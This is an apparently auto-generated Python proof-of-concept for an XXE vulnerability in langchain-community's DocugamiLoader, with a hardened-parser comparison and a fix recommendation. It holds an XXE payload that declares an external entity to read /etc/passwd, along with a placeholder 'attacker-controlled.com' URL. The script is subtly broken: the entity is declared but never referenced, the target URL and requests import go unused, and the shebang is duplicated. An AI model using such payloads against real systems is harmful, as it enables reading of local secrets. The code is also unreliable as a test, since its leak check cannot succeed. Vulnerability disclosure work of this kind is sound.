#!/usr/bin/env python3
# PoC for langchain-community-only (/tmp/langchain-community-only)
# Path: xxe-003
# Sink: _metadata_for_project
# Auto-generated — run with: python3 xxe_sink_function_metadata_project__metadata_for_project.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept: XXE in langchain-community DocugamiLoader

Vulnerability: The _metadata_for_project method in DocugamiLoader uses
lxml.etree.parse() with default settings to parse XML fetched from an external
API. lxml's default parser resolves external entities, enabling XXE attacks.

Attack scenario: An attacker who can control the API response (e.g., via MITM,
compromised upstream, or malicious project artifacts) can inject a malicious
XML payload that reads local files or performs SSRF.

This PoC demonstrates file exfiltration by reading /etc/passwd using an
external entity.
"""

import io
import sys
import requests
from lxml import etree

# Configuration
TARGET_URL = "http://localhost:8080/api/v1/trigger"  # Adjust as needed
# The payload will attempt to read /etc/passwd via XXE
XXE_PAYLOAD = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<project>
  <artifacts>
    <artifact>
      <name>report-values.xml</name>
      <url>http://attacker-controlled.com/malicious</url>
      <document>
        <id>doc123</id>
      </document>
    </artifact>
  </artifacts>
</project>"""


def simulate_xxe_attack():
    """
    Simulates the XXE attack by directly calling the vulnerable parsing logic
    with a malicious XML payload.
    """
    print("[*] Simulating XXE attack on DocugamiLoader...")
    print(f"[*] Payload: {XXE_PAYLOAD[:100]}...")

    try:
        # This mimics what _metadata_for_project does with the XML content
        # from the API response
        xml_bytes = XXE_PAYLOAD.encode("utf-8")
        parser = etree.XMLParser()  # Default parser - vulnerable!
        tree = etree.parse(io.BytesIO(xml_bytes), parser)
        root = tree.getroot()

        # If XXE succeeds, the entity will be resolved and we can see the file
        # content in the parsed tree
        print("[+] XML parsed successfully (vulnerable parser)")
        print(f"[*] Root tag: {root.tag}")

        # Try to find the entity reference in the parsed content
        # The entity &xxe; would be resolved to file contents
        for elem in root.iter():
            if elem.text and "root:" in elem.text:
                print(f"[!] XXE SUCCESSFUL! File content leaked:")
                print(elem.text[:500])
                return True

        print("[*] No obvious file content found in parsed output")
        print("[*] This may mean the entity wasn't referenced in the payload")
        return False

    except etree.XMLSyntaxError as e:
        print(f"[-] XML parsing error: {e}")
        return False
    except Exception as e:
        print(f"[-] Unexpected error: {e}")
        return False


def demonstrate_secure_parsing():
    """
    Demonstrates how the parsing SHOULD be done to prevent XXE.
    """
    print("\n[*] Demonstrating secure parsing (for comparison)...")
    
    try:
        # Secure parser configuration
        parser = etree.XMLParser(
            resolve_entities=False,
            no_network=True,
            dtd_validation=False,
            load_dtd=False,
        )
        xml_bytes = XXE_PAYLOAD.encode("utf-8")
        tree = etree.parse(io.BytesIO(xml_bytes), parser)
        root = tree.getroot()
        
        print("[+] XML parsed with secure configuration")
        print("[*] Entity was NOT resolved (as expected)")
        print(f"[*] Root tag: {root.tag}")
        
        # Check that entity wasn't resolved
        for elem in root.iter():
            if elem.text and "root:" in elem.text:
                print("[!] WARNING: Entity was still resolved!")
                return False
        
        print("[✓] Secure parsing prevented entity resolution")
        return True
        
    except Exception as e:
        print(f"[-] Error during secure parsing: {e}")
        return False


def main():
    """
    Main function to run the PoC.
    """
    print("=" * 60)
    print("XXE Proof-of-Concept for langchain-community DocugamiLoader")
    print("=" * 60)
    print()
    
    # Step 1: Demonstrate the vulnerability
    print("[Step 1] Testing vulnerable parsing (default lxml settings)...")
    vulnerable_result = simulate_xxe_attack()
    
    print()
    
    # Step 2: Show the secure alternative
    print("[Step 2] Testing secure parsing (with protections)...")
    secure_result = demonstrate_secure_parsing()
    
    print()
    print("=" * 60)
    print("Summary:")
    print(f"  - Vulnerable parsing: {'VULNERABLE' if vulnerable_result else 'Tested (see output)'}")
    print(f"  - Secure parsing: {'PROTECTED' if secure_result else 'Tested (see output)'}")
    print()
    print("Recommendation: Use secure parser configuration:")
    print("  parser = etree.XMLParser(resolve_entities=False, no_network=True)")
    print("=" * 60)
    
    return 0 if vulnerable_result else 1


if __name__ == "__main__":
    sys.exit(main())
